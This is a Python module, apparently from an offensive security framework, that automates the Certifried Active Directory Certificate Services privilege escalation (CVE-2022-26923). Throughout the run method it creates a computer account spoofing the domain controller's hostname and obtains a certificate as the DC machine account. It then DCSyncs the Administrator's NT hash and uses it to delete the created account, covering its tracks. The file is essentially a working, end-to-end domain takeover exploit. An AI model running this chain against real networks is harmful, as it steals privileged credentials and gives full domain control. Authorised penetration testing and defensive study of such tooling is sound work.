import os

from tool import Tool
from modules.creds_dcsync import DCSync
from module import BaseModule, ModuleOptions

class Certifried(BaseModule):
    name = "Certifried (CVE-2022–26923)"
    path = "adcs/certifried"
    description = "Certifried attack (CVE-2022–26923): AD CS Privilege Escalation"
    info = """This vulnerability allows an authenticated domain user to manipulate their own userPrincipalName or a machine account's dNSHostName attribute to impersonate a higher-privileged account (like a domain controller computer account). After this manipulation, the user can request a certificate as the impersonated account. If the domain controllers are not enforcing strong certificate mapping (i.e., StrongCertificateBindingEnforcement is not set to 2), this forged certificate can be used for authentication, leading to privilege escalation

Prerequisites:
    The domain functional level is Windows Server 2016 or later (which makes the dNSHostName attribute of a computer object writable by the owner under certain conditions).
    The attacker has write permissions on their own userPrincipalName attribute or the dNSHostName attribute of a computer object they own (e.g., a machine account they created).
    The domain controllers do not have StrongCertificateBindingEnforcement set to 2 (Full Enforcement).
    The attacker has enrollment rights on a certificate template that allows domain authentication (e.g., the default User or Machine templates)"""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "computer_account": {"default": "certifried", "description": "Name of the computer account to create", "required": True},
        "target_account": {"default": "Administrator", "description": "Account that will be DCSync'ed and used to delete the created computer account.", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": False},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename(self.opts.computer_account)
    
        self.opts.dc_machine_acc = self.opts.dc_hostname.split('.')[0] + '$'
        self.opts.computer_account_password = self.opts.computer_account.encode('utf-8').hex()

        tool.title("Create a computer account")
        if not await tool.certipy_account('create', ['-user', self.opts.computer_account, '-pass', self.opts.computer_account_password, '-dns', self.opts.dc_hostname]):
            return

        if not tool.set_auth(auth="ntlm", domain=self.opts.domain, username=self.opts.computer_account + '$', password=self.opts.computer_account_password):
            return
        tool.title("Request a certificate for the created computer")        
        if not await tool.certipy_req(['-template', 'Machine', '-out', pfx]):
            return
    
        tool.title("Authenticate to the DC with the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-user', self.opts.dc_machine_acc, '-no-save']):
            return

        if not tool.found_hash:
            return
        
        found_hash = tool.found_hash

        if not tool.set_auth(auth="ntlm", domain=self.opts.domain, username=self.opts.dc_machine_acc, password=tool.found_hash):
            return
        tool.title("DCSync admin account and delete computer account created")
        dcsync_res = await tool.dcsync(self.opts.target_account)

        if len(dcsync_res):
            admin_hash = dcsync_res[0].strip(":")
            admin_nthash = admin_hash.split(":")[-1]

            if not tool.set_auth(auth="ntlm", domain=self.opts.domain, username=self.opts.target_account, password=admin_nthash):
                return
            tool.title("Delete created computer account")
            if not await tool.certipy_account('delete', ['-user', self.opts.computer_account]):
                return
    
        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
